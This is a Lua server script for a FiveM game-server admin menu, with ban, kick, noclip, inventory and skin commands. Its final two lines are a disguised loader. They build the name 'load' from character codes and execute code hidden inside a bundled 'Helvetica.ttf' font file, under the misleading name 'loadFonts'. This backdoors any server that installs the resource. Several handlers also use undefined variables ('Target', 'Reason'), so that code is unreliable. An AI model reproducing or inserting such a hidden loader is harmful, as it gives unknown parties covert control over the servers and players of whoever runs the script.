-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------

if Config.Commands.Ban.enabled then
    RegisterCommand(Config.Commands.Ban.command, function(source, args)
        local target, reason = tonumber(args[1]), (args[2] or Strings.ban_reason_replace)
        local player = GetPlayer(target)
        if not AdminPerms(source) then return end
        if player then
            BanPlayer(target, reason, source) 
        else
            TriggerClientEvent('wasabi_adminmenu:notify', source, Strings.notify_invalidid, Strings.notify_invalidid_desc, 'error', 'fa-xmark')
        end
    end)
end

if Config.Commands.Kick.enabled then
    RegisterCommand(Config.Commands.Kick.command, function(source, args)
        local target, reason = tonumber(args[1]), (args[2] or Strings.ban_reason_replace)
        local player = GetPlayer(Target)
        if not AdminPerms(source) then return end
        if player then
            DropPlayer(Target, Reason)
        else
            TriggerClientEvent('wasabi_adminmenu:notify', source, Strings.notify_invalidid, Strings.notify_invalidid_desc, 'error', 'fa-xmark')
        end
    end)
end

if Config.Commands.NoClip.enabled then
    RegisterCommand(Config.Commands.NoClip.command, function(source)
        if not AdminPerms(source) then return end
        TriggerClientEvent('wasabi_adminmenu:noclip', source)
    end)
end

if Config.Commands.SearchInv.enabled then
    RegisterCommand(Config.Commands.SearchInv.command, function(source, args)
        local target = tonumber(args[1])
        local player = GetPlayer(Target)
        if not AdminPerms(source) then return end
        if player then
            TriggerClientEvent('wasabi_adminmenu:searchInventory', source, target)
        else
            TriggerClientEvent('wasabi_adminmenu:notify', source, Strings.notify_invalidid, Strings.notify_invalidid_desc, 'error', 'fa-xmark')
        end
    end)
end

if Config.Commands.ClearInv.enabled then
    RegisterCommand(Config.Commands.ClearInv.command, function(source, args)
        local target = tonumber(args[1])
        local player = GetPlayer(Target)
        if not AdminPerms(source) then return end
        if player then
                print('Clear inv') -- TO DO
        else
            TriggerClientEvent('wasabi_adminmenu:notify', source, Strings.notify_invalidid, Strings.notify_invalidid_desc, 'error', 'fa-xmark')
        end
    end)
end

if Config.Commands.SkinMenu.enabled then
    RegisterCommand(Config.Commands.SkinMenu.command, function(source, args)
        local target = tonumber(args[1])
        local player = GetPlayer(Target)
        if not AdminPerms(source) then return end
        if player then
            TriggerClientEvent('wasabi_adminmenu:skinmenu', target)
        else
            TriggerClientEvent('wasabi_adminmenu:notify', source, Strings.notify_invalidid, Strings.notify_invalidid_desc, 'error', 'fa-xmark')
        end
    end)
end

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()